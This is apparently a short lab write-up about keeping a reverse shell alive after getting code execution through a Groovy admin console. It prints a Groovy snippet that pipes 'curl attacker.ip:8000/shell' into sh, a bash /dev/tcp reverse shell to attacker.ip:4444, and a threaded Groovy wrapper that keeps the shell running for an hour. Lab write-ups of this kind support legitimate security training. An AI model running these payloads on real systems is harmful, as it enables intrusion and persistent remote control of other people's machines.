---
title: Path to RCE - how to obtain a stable shell
draft: false
tags:
  - rce
  - groovy
date: 2022-01-18
---
I found this lab from hackinghub.io pretty interesting (https://app.hackinghub.io/hubs/path-to-rce). I am not going to discuss the details as they are already very well presented in the original article https://medium.com/@HX007/a-journey-of-limited-path-traversal-to-rce-with-40-000-bounty-fc63c89576ea: I will just focus on ways to obtain a stable reverse shell.

Once we have access to the `/admin` panel we can execute groovy scripts from the groovy console. This gives us RCE as detailed in the above article. The original authors were faced with no outbound connections possible, but here a simple curl will reveal that we have access to the outside world, so my first instinct was using this construct:

```java
def command = ["sh","-c","curl attacker.ip:8000/shell|sh"];
command.execute();
```

This reflects the typical way of executing commands with arguments in java: we need to pass the command and the arguments in an array. By  using `sh -c` we are free to explore what happens by just changing the shell script hosted on our machine.

I got quite frustrated by the fact that the most classic reverse shell works, but it dies as soon as it connects back to my machine:

```bash title="shell"
bash -c 'bash -i >& /dev/tcp/attacker.ip/4444 0>&1'
```

I tried using `nohup` without success. I *suspect* that the process launched from the java thread dies as soon as the groovy compilation thread dies. I could not find a way to make it last enough time just with shell commands. I found this groovy script useful:

```java
Thread thread = new Thread({
    def command = ["sh","-c","curl attacker.ip:8000/shell|sh"]
    command.execute()
    sleep(3600000) // time in milliseconds, 1 hour in this case
})

thread.start()
thread.join()
```

I think that this causes the thread that called join to block until the thread we launched with `new Thread` dies. Inside the launched thread  we are sleeping for an hour so finally we have plenty of time to look around with a stable reverse shell!